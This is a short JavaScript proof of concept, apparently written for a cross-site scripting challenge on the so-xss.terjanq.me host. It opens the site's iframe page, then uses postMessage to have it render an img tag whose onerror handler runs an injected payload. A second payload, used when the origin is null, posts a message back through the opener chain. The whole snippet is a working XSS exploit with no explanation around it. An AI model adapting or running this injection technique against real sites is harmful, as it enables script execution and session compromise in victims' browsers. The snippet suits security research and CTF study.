function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function render(identifier, payload) {
  var w = window.open("https://so-xss.terjanq.me/iframe.php");
  await sleep(2000);
  w.postMessage(
    {
      identifier,
      type: "render",
      body: `<img src=q onerror="${payload}">`
    },
    "*"
  );
}

if (origin==='null') {
  render("foo","opener.parent.postMessage({identifier}, '*')");
}
